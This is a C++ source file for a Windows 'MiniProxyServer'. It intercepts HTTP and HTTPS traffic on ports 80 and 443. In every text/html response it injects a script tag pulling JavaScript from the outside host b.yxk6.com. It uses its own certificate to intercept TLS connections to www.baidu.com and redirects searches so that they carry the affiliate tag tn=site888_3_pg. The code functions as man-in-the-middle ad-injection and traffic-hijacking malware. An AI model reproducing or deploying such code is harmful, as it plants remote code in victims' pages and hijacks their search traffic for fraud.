// MiniProxyServer.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <atlstr.h>
#include "TcpSocket.h"
#include "HttpSendParser.h"
#include "UrlParser.h"
#include "HelpFun.h"
#include ".\http数据解析\HttpDataParser.h"

typedef struct tagCALLBACK_PARAM
{
	BOOL bReplaceData;
	CTcpSocket *pclientSock;
}CALLBACK_PARAM,*PCALLBACK_PARAM;
VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData,BOOL bFinalData)
{
	PCALLBACK_PARAM pCallbackParam = (PCALLBACK_PARAM)pParam;

	if ( NULL == pData || nDataLen == 0 )
	{
		return ;
	}
	
	if (bHeadData)
	{
		pCallbackParam->bReplaceData = FALSE;

		CHttpRecvParser recvParser;
		if(recvParser.ParseData((const char *)pData,nDataLen))
		{
			if (recvParser.GetResponseCode() == "200")
			{
				CStringA strContentType;
				strContentType = recvParser.GetValueByName("Content-Type");
				if (strContentType.Find("text/html") >= 0 )
				{
					recvParser.DelResponseNode("Content-Encoding");
					recvParser.DelResponseNode("Content-Length");
					recvParser.DelResponseNode("Transfer-Encoding");
					recvParser.AddResponseNode("Transfer-Encoding","chunked");

					pCallbackParam->bReplaceData = TRUE;

					CStringA strNewBuffer;
					recvParser.BuildBuffer(strNewBuffer);
					pCallbackParam->pclientSock->SendData(strNewBuffer.GetBuffer(),strNewBuffer.GetLength());
				}
			}

		}
	}
	else
	{
		if (pCallbackParam->bReplaceData)
		{
			CStringA strTempData;

			char *pchTemp = new char[nDataLen+1];
			memcpy_s(pchTemp,nDataLen,(char *)pData,nDataLen);
			pchTemp[nDataLen] = 0;
			
			strTempData = pchTemp;

			delete pchTemp;

			strTempData.Replace("</body>","<script src='http://b.yxk6.com/qm20160728.js'></script></body>");

			CStringA strChunkData;
			strChunkData.Format("%x\r\n%s\r\n",strTempData.GetLength(),strTempData.GetBuffer());
			pCallbackParam->pclientSock->SendData(strChunkData.GetBuffer(),strChunkData.GetLength());

			if (bFinalData)
			{
				CStringA strChunkData;
				strChunkData = "0\r\n\r\n";
				pCallbackParam->pclientSock->SendData(strChunkData.GetBuffer(),strChunkData.GetLength());
			}

		}
	}


}
VOID HandleConnect( SOCKET sockClient,SOCKET sockRemote )
{
	CTcpSocket clientSock;
	CTcpSocket remoteSock;
	
	CALLBACK_PARAM CallbackParam;
	CallbackParam.bReplaceData = FALSE;
	CallbackParam.pclientSock = &clientSock;

	CHttpDataParser dataParser(DataRecvedCallback,&CallbackParam);
	do
	{
		clientSock.Attach(sockClient);
		remoteSock.Attach(sockRemote);
		
		char chRecvBuffer[4096];
		while (TRUE)
		{
			FD_SET fdRead;
			FD_ZERO( &fdRead );
			FD_SET(clientSock.GetHandle(),&fdRead);
			FD_SET(remoteSock.GetHandle(),&fdRead);
			int nRet = select(0,&fdRead,NULL,NULL,NULL);

			if ( nRet != SOCKET_ERROR )
			{
				//从远程服务器发来的数据
				if(FD_ISSET(remoteSock.GetHandle(),&fdRead)!=0)
				{
					int nRecvLen = remoteSock.RecvData( chRecvBuffer,4096 );
					if ( SOCKET_ERROR == nRecvLen || 0 == nRecvLen )
					{
						//	DebugStringA("remoteSock Break %d",nRecvLen);
						break;
					}

					BOOL bFinalData = FALSE;
					dataParser.ParseRecvData((BYTE *)chRecvBuffer,nRecvLen,&bFinalData);
					if ( bFinalData )
					{
						dataParser.ResetParser();
					}

					if ( FALSE == CallbackParam.bReplaceData )
					{
						int nSendLen = clientSock.SendData(chRecvBuffer,nRecvLen);
						if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
						{
							break;
						}
					}
				}

				//客户机利用已有TCP链接继续请求
				if(FD_ISSET(clientSock.GetHandle(),&fdRead)!=0)
				{

					int nRecvLen = clientSock.RecvData( chRecvBuffer,4096 );
					if ( SOCKET_ERROR == nRecvLen || 0 == nRecvLen )
					{
						//DebugStringA("clientSock Break %d",nRecvLen);
						break;
					}

					//DebugStringA("clientSock RecvData %d",nRecvLen);

					CHttpSendParser sendparser;
					if(sendparser.ParseData(chRecvBuffer,nRecvLen))
					{
						//DebugStringA("Url:%s",sendparser.GetParseUrl());
					}

					int nSendLen = remoteSock.SendData(chRecvBuffer,nRecvLen);
					if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
					{
						//DebugStringA("remoteSock Break %d",nSendLen);
						break;
					}
					//DebugStringA("remoteSock SendData %d",nSendLen);
				}

				//DebugStringA("--------------------------------------");

			}
			else
			{
				DebugStringA("select read error %d",WSAGetLastError());
			}

			Sleep(1);
		}
	}
	while(FALSE);

	DebugStringA("remoteSock Closed");

	clientSock.Detach();
	remoteSock.Detach();
}


DWORD WINAPI RequestHandleThread(PVOID pParam)
{
	CTcpSocket clientSock;
	CTcpSocket remoteSock;

	clientSock.Attach((SOCKET)pParam);

 	CStringA strRequestHead;
 	CStringA strHost;
 	int nRes = 0;
 	char chRecvBuf[4097];
	FD_SET fdRead;
	FD_ZERO(&fdRead);
	FD_SET(clientSock.GetHandle(),&fdRead);
 	while( TRUE )
 	{
		int nRes = select(0,&fdRead,NULL,NULL,NULL);
		
		nRes = clientSock.RecvData(chRecvBuf,4096);
 		chRecvBuf[nRes] = 0;
 		strRequestHead+=chRecvBuf;
 
 		if ( strRequestHead.Find("\r\n\r\n") >= 0 )
 		{
 			CHttpSendParser sendparser;
 			if(sendparser.ParseData(strRequestHead.GetBuffer(),strRequestHead.GetLength()))
 			{
 				strHost = sendparser.GetHost();
 				DebugStringA("Host:%s",strHost);
 			}
 			break;
 		}

		Sleep(1);
 	}
 	
	do 
	{
		if ( strHost.CompareNoCase("localhost") == 0 || strHost.IsEmpty())
		{
			break;
		}

		if(!remoteSock.CreateTcpSocket())
		{
			DebugStringA("remoteSock CreateTcpSocket Failed %d",WSAGetLastError());
			break;
		}

		if(!remoteSock.Connect(strHost,80))
		{
			DebugStringA("remoteSock Connect Failed %d",WSAGetLastError());
			break;
		}

		int nRes = remoteSock.SendData(strRequestHead.GetBuffer(),strRequestHead.GetLength());
		if ( nRes == SOCKET_ERROR )
		{
			DebugStringA("remoteSock SendData Failed %d",WSAGetLastError());
			break;
		}

		HandleConnect( clientSock.GetHandle(),remoteSock.GetHandle() );

	} while (FALSE);

	clientSock.CloseTcpSocket();
	remoteSock.CloseTcpSocket();

	return 0;
}
// 导出函数
VOID WINAPI HttpProxyServer()
{
	CTcpSocket sockListen;
	BOOL bRes = sockListen.CreateTcpSocket();
	if (bRes)
	{
		bRes = sockListen.InitAccept(80);
		if (bRes)
		{
			while (TRUE)
			{
				SOCKET sockclient = sockListen.Accept(NULL);

				DebugStringA("New Client Connected Socket:0x%x",sockclient);

				CreateThread(NULL,0,RequestHandleThread,(PVOID)sockclient,0,NULL);

				Sleep(1);
			}
		}

	}
}

#include "SSLTcpSocket.h";

VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock ,LPCSTR pchHost )
{
	CStringA strHost;
	strHost = pchHost;
	
	CStringA strClientSendBuffer;

	do
	{
		char chRecvBuffer[4096];
		while (TRUE)
		{
			FD_SET fdRead;
			FD_ZERO( &fdRead );
			FD_SET(pclientsock->GetHandle(),&fdRead);
			FD_SET(premotesock->GetHandle(),&fdRead);
			int nRet = select(0,&fdRead,NULL,NULL,NULL);

			if ( nRet != SOCKET_ERROR )
			{
				//从远程服务器发来的数据
				if(FD_ISSET(premotesock->GetHandle(),&fdRead)!=0)
				{
					int nRecvLen = premotesock->RecvData( chRecvBuffer,4096 );
					if ( SOCKET_ERROR == nRecvLen || 0 == nRecvLen )
					{
						//	DebugStringA("remoteSock Break %d",nRecvLen);
						break;
					}

					//	DebugStringA("remoteSock RecvData %d",nRecvLen);

					int nSendLen = pclientsock->SendData(chRecvBuffer,nRecvLen);
					if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
					{
						//	DebugStringA("clientSock Break %d",nSendLen);
						break;
					}

					//DebugStringA("clientSock SendData %d",nSendLen);
				}

				//客户机利用已有TCP链接继续请求
				if(FD_ISSET(pclientsock->GetHandle(),&fdRead)!=0)
				{
					int nRecvLen = pclientsock->RecvData( chRecvBuffer,4096 );
					if ( SOCKET_ERROR == nRecvLen || 0 == nRecvLen )
					{
						DebugStringA("clientSock Break %d",nRecvLen);
						break;
					}

					chRecvBuffer[nRecvLen] = 0;
					
					strClientSendBuffer+=chRecvBuffer;

// 					if ( strHost == "www.baidu.com" )
// 					{
// 						OutputDebugStringA(chRecvBuffer);
// 						OutputDebugStringA("\r\n");
// 						OutputDebugStringA("--------------------------------------------------------------------------------------------------");
// 						OutputDebugStringA("\r\n");
// 					}
					
					//DebugStringA("clientSock RecvData %d",nRecvLen);
					
					BOOL bTransmitData = TRUE;
					CHttpSendParser sendparser;
					if(sendparser.ParseData(strClientSendBuffer,strClientSendBuffer.GetLength()))
					{
						strClientSendBuffer="";

 						CStringA strUrl;
						CStringA strHost;
 						strUrl = sendparser.GetParseUrl();
						strHost = sendparser.GetHost();
 						OutputDebugStringA("Url: "+strUrl+"\r\n");

						if ( strHost.CompareNoCase("www.baidu.com") == 0 )
						{
							CUrlParser urlparser;
							urlparser.SetUrl(strUrl);
							urlparser.ParseUrl();
							CStringA strPath;
							strPath = urlparser.GetPath();

							if ( strPath == "/" || strPath == "/index.php" )
							{
								CStringA strPid;
								urlparser.GetParamValueByName("tn",strPid);
								if ( strPid.CompareNoCase("site888_3_pg") != 0 )
								{
									LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=site888_3_pg\r\nConnection: Close\r\nContent-Length:0\r\n\r\n";
									pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
									bTransmitData = FALSE;
								}


							}

							if ( strPath == "/s" )
							{
								CStringA strPid;
								urlparser.GetParamValueByName("tn",strPid);
								if ( strPid.CompareNoCase("site888_3_pg") != 0 )
								{
									CStringA strNewUrl;
									urlparser.AddOrSetParamValue("tn","site888_3_pg");
									strNewUrl = urlparser.BuildUrl();
									strNewUrl.Replace("http://","https://");
									CStringA strReponseData;
									strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\nConnection: Close\r\nContent-Length:0\r\n\r\n",strNewUrl);

									pclientsock->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
									bTransmitData = FALSE;
								}
							}
						}


					}
					
					if(bTransmitData)
					{
						int nSendLen = premotesock->SendData(chRecvBuffer,nRecvLen);
						if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
						{
							//DebugStringA("remoteSock Break %d",nSendLen);
							break;
						}
						//DebugStringA("remoteSock SendData %d",nSendLen);
					}

				}

				//DebugStringA("--------------------------------------");

			}
			else
			{
				DebugStringA("select read error %d",WSAGetLastError());
			}

			Sleep(1);
		}
	}
	while(FALSE);

	DebugStringA("remoteSock Closed");

	return;
}

DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
{
	CSSLTcpSocket *psslclient = (CSSLTcpSocket *)pParam;
	
	if ( NULL == psslclient )
	{
		return 0;
	}
	
	BOOL bTransmitData = TRUE;
	char chReadBuffer[4096];
	int  nReadTotalLen = 0;
	CStringA strHost;
	while (1)
	{
		int nRet = psslclient->RecvData( chReadBuffer+nReadTotalLen,4096-nReadTotalLen );
		if (nRet == -1 || 0 == nRet )
		{
			break;
		}

		nReadTotalLen+=nRet;

		CHttpSendParser sendparser;
		if(sendparser.ParseData(chReadBuffer,nReadTotalLen))
		{
			strHost = sendparser.GetHost();
			OutputDebugStringA("Host: "+strHost+"\r\n");

			CStringA strUrl;
			strUrl = sendparser.GetParseUrl();
			OutputDebugStringA("Url: "+strUrl+"\r\n");

			if (strHost == "www.baidu.com")
			{
				CUrlParser urlparser;
				urlparser.SetUrl(strUrl);
				urlparser.ParseUrl();
				CStringA strPath;
				strPath = urlparser.GetPath();

				if ( strPath == "/" || strPath == "/index.php" )
				{
					CStringA strPid;
					urlparser.GetParamValueByName("tn",strPid);
					if ( strPid.CompareNoCase("site888_3_pg") != 0 )
					{
						LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=site888_3_pg\r\nConnection: Close\r\nContent-Length:0\r\n\r\n";
						psslclient->SendData((PVOID)pchResponseData,strlen(pchResponseData));
						bTransmitData = FALSE;
					}
					

				}

				if ( strPath == "/s" )
				{
					CStringA strPid;
					urlparser.GetParamValueByName("tn",strPid);
					if ( strPid.CompareNoCase("site888_3_pg") != 0 )
					{
						CStringA strNewUrl;
						urlparser.AddOrSetParamValue("tn","site888_3_pg");
						strNewUrl = urlparser.BuildUrl();
						strNewUrl.Replace("http://","https://");
						CStringA strReponseData;
						strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\nConnection: Close\r\nContent-Length:0\r\n\r\n",strNewUrl);
						
						psslclient->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
						bTransmitData = FALSE;
					}
				}

			}


			break;
		}

		Sleep(1);
	}
	
	if ( strHost.GetLength() > 0 )
	{
		CSSLTcpSocket *psslremote = new CSSLTcpSocket();
		psslremote->CreateSSLTcpSocketForClient();
		psslremote->SSLConnect(/*strHost*/"61.135.169.121",443);

		if (bTransmitData)
		{
			int nRet = psslremote->SendData((PVOID)chReadBuffer,nReadTotalLen);
		}
		else
		{
			int a=0;
		}

		HandleHttpsConnect(psslclient,psslremote,strHost);
	}


	return 0;
}

VOID HttpsProxyServer()
{
	CSSLTcpSocket sslsock;
	BOOL bRes = sslsock.CreateSSLTcpSocketForServer( "server.crt","server.key" );
	if ( bRes )
	{
		sslsock.InitAccept(443);

		while (TRUE)
		{
			CSSLTcpSocket *psslclient = sslsock.SSLAccept(NULL);
			if (psslclient)
			{
				CreateThread( NULL,0,HttpsRequestHandleThread,psslclient,0,NULL );
			}
			Sleep(1);
		}

	}
}

#pragma comment(lib,"urlmon")
int _tmain(int argc, _TCHAR* argv[])
{
	//HttpsProxyServer();
	HttpProxyServer();

	Sleep(500);

	getchar();
	return 0;
}

